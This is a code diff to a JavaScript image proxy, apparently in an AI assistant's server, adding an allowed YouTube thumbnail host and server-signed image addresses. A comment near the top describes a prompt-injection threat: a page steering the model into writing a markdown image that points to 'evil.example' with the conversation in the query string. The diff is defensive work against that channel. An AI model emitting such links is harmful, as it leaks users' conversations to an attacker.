@@ -1,3 +1,4 @@
+import crypto from 'node:crypto';
 import { safeFetch, readCapped } from './util/safeFetch.js';
 
 /**
@@ -23,7 +24,51 @@ const IMAGE_HOSTS = [
   /^live\.staticflickr\.com$/,
   // Club crests and league badges on a scores card.
   /^r2\.thesportsdb\.com$/,
+  // A YouTube video's thumbnail, for the card a video link becomes in a reply.
+  /^i\.ytimg\.com$/,
 ];
+
+/**
+ * A picture from a page the assistant actually read, signed by this server.
+ *
+ * The fixed list above cannot hold a shop's product photos, and lifting it
+ * would make this an open proxy — worse, an exfiltration channel: a model
+ * steered by a page could write `![](https://evil.example/?d=<the
+ * conversation>)` into a reply, and the browser would ask this server to fetch
+ * it. So a picture from anywhere else is fetched only with a signature that
+ * this server made when it read the page the picture is on (see
+ * `pageImages` in tools/cloud.js). A model can repeat a signed address; it
+ * cannot make a new one, so it cannot put anything into an address either.
+ */
+function signingKey() {
+  const secret = process.env.SESSION_SECRET || process.env.ENCRYPTION_KEY || '';
+  // Derived, so the image signature can never be used as anything else.
+  return crypto.createHmac('sha256', secret || 'synapsez-dev-only').update('image-proxy-v1').digest();
+}
+
+export function imageSignature(href) {
+  return crypto.createHmac('sha256', signingKey()).update(String(href)).digest('base64url').slice(0, 22);
+}
+
+/** The app-relative address that shows `href`, signed. Null when it is not an https address. */
+export function signedImagePath(href) {
+  let url;
+  try {
+    url = new URL(String(href || ''));
+  } catch {
+    return null;
+  }
+  if (url.protocol !== 'https:' || url.username || url.password) return null;
+  return `/api/image?u=${encodeURIComponent(url.href)}&s=${imageSignature(url.href)}`;
+}
+
+/** Whether `sig` is this server's signature for `value`. Constant-time. */
+function signedFor(value, sig) {
+  if (!sig || typeof sig !== 'string') return false;
+  const expected = Buffer.from(imageSignature(String(value)));
+  const given = Buffer.from(sig);
+  return expected.length === given.length && crypto.timingSafeEqual(expected, given);
+}
 
 const RASTER = /^image\/(png|jpeg|gif|webp|avif)$/i;
 const MAX_IMAGE_BYTES = 4 * 1024 * 1024;
@@ -84,9 +129,21 @@ async function fetchRaster(url) {
   return { type, data: buffer };
 }
 
-/** The picture at `value`, or null — off the list, not an image, or too large. */
-export async function proxiedImage(value) {
-  const url = allowedImageUrl(value);
+/**
+ * The picture at `value`, or null — off the list and unsigned, not an image,
+ * or too large. Signed addresses still go through `safeFetch`, so a page that
+ * names an internal address gets nothing.
+ */
+export async function proxiedImage(value, sig = null) {
+  let url = allowedImageUrl(value);
+  if (!url && signedFor(value, sig)) {
+    try {
+      url = new URL(String(value));
+    } catch {
+      url = null;
+    }
+    if (url && (url.protocol !== 'https:' || url.username || url.password)) url = null;
+  }
   if (!url) return null;
   const key = url.href;
   if (cache.has(key)) return cache.get(key);
